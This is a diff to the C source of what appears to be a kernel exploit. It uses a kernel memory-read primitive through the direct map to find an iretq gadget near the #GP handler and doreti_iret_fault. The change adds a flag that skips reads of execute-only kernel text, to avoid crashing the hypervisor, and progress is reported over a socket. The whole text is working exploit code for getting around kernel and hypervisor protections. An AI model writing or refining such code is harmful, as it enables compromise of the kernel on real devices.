@@ -4736,6 +4736,7 @@ broad_done:
          * for iretq (0x48 0xcf) without any kernel writes — completely
          * avoiding the TSS/IDT modification that causes kernel panics.
          */
+        int text_dmap_xom = 0;  /* set by Strategy A if DMAP .text reads fail */
         if (gp_handler_va != 0 && have_text_pa) {
             send_response(sock, "\n7b+. Strategy A: scanning text near "
                           "#GP handler 0x%lx...\n", gp_handler_va);
@@ -4887,6 +4888,7 @@ broad_done:
             } else {
                 send_response(sock, "  .text is XOM via DMAP — "
                               "Strategy A cannot read code\n");
+                text_dmap_xom = 1;
             }
         }
 
@@ -5038,70 +5040,76 @@ broad_done:
                         num_near_ptrs);
                 }
 
-                /* Try to verify each via DMAP read (risky — XOM DMAP
-                 * reads may cause harder faults on some pages).
-                 * Bail out after 3 consecutive failures — if .text is
-                 * XOM, all remaining reads will also fail. */
+                /* Try to verify each via DMAP read — but SKIP entirely
+                 * if Strategy A already confirmed .text is XOM.  Even a
+                 * single DMAP read of an XOM page can trigger a fatal HV
+                 * EPT violation after many prior kernel_copyout calls. */
                 uint64_t best_doreti = 0;
                 int best_score = 0;
-                int dmap_consec_fail = 0;
 
-                for (int i = 0; i < num_near_ptrs && i < 32; i++) {
-                    uint64_t va = near_ptrs[i].text_va;
-                    int64_t dist = near_ptrs[i].dist;
-                    uint64_t koff = va - (uint64_t)ktext_base;
+                if (text_dmap_xom) {
+                    send_response(sock,
+                        "  Skipping DMAP verification — "
+                        "Strategy A confirmed .text is XOM\n");
+                } else {
+                    int dmap_consec_fail = 0;
+                    for (int i = 0; i < num_near_ptrs && i < 32; i++) {
+                        uint64_t va = near_ptrs[i].text_va;
+                        int64_t dist = near_ptrs[i].dist;
+                        uint64_t koff = va - (uint64_t)ktext_base;
 
-                    send_response(sock, "  ptr: 0x%lx (ktext+0x%lx, "
-                                  "dist=%+ld) @ kdata+0x%lx",
-                                  va, koff, (long)dist,
-                                  near_ptrs[i].data_addr - data_start);
+                        send_response(sock, "  ptr: 0x%lx (ktext+0x%lx, "
+                                      "dist=%+ld) @ kdata+0x%lx",
+                                      va, koff, (long)dist,
+                                      near_ptrs[i].data_addr - data_start);
 
-                    /* Try DMAP read at the pointer target */
-                    if (have_text_pa) {
-                        uint64_t target_pa = text_pa + koff;
-                        uint8_t code[8];
-                        if (kernel_copyout(dmap_base + target_pa,
-                                           code, sizeof(code)) == 0) {
-                            dmap_consec_fail = 0;
-                            if (code[0] == 0x48 && code[1] == 0xcf) {
-                                int score = 1;
-                                send_response(sock, " -> IRETQ!");
-                                /* Check for V+2 pair (doreti_iret_fault) */
-                                for (int j = 0; j < num_near_ptrs; j++) {
-                                    if (near_ptrs[j].text_va == va + 2) {
-                                        score += 5;
-                                        send_response(sock,
-                                            " PAIR at +2 "
-                                            "(doreti_iret_fault)!");
-                                        break;
+                        /* Try DMAP read at the pointer target */
+                        if (have_text_pa) {
+                            uint64_t target_pa = text_pa + koff;
+                            uint8_t code[8];
+                            if (kernel_copyout(dmap_base + target_pa,
+                                               code, sizeof(code)) == 0) {
+                                dmap_consec_fail = 0;
+                                if (code[0] == 0x48 && code[1] == 0xcf) {
+                                    int score = 1;
+                                    send_response(sock, " -> IRETQ!");
+                                    for (int j = 0; j < num_near_ptrs; j++) {
+                                        if (near_ptrs[j].text_va == va + 2) {
+                                            score += 5;
+                                            send_response(sock,
+                                                " PAIR at +2 "
+                                                "(doreti_iret_fault)!");
+                                            break;
+                                        }
                                     }
-                                }
-                                if (dist < 0)
-                                    score += 1; /* before handler = expected */
-                                send_response(sock, " score=%d\n", score);
-                                if (score > best_score) {
-                                    best_score = score;
-                                    best_doreti = va;
+                                    if (dist < 0)
+                                        score += 1;
+                                    send_response(sock, " score=%d\n", score);
+                                    if (score > best_score) {
+                                        best_score = score;
+                                        best_doreti = va;
+                                    }
+                                } else {
+                                    send_response(sock, " -> %02x %02x "
+                                                  "(not iretq)\n",
+                                                  code[0], code[1]);
                                 }
                             } else {
-                                send_response(sock, " -> %02x %02x "
-                                              "(not iretq)\n",
-                                              code[0], code[1]);
+                                send_response(sock,
+                                    " -> DMAP unreadable\n");
+                                dmap_consec_fail++;
+                                if (dmap_consec_fail >= 3) {
+                                    send_response(sock,
+                                        "  .text is XOM — skipping "
+                                        "remaining %d DMAP reads\n",
+                                        (num_near_ptrs < 32 ?
+                                         num_near_ptrs : 32) - i - 1);
+                                    break;
+                                }
                             }
                         } else {
-                            send_response(sock, " -> DMAP unreadable\n");
-                            dmap_consec_fail++;
-                            if (dmap_consec_fail >= 3) {
-                                send_response(sock,
-                                    "  .text is XOM — skipping remaining "
-                                    "%d DMAP reads\n",
-                                    (num_near_ptrs < 32 ?
-                                     num_near_ptrs : 32) - i - 1);
-                                break;
-                            }
+                            send_response(sock, " -> no text PA\n");
                         }
-                    } else {
-                        send_response(sock, " -> no text PA\n");
                     }
                 }
 
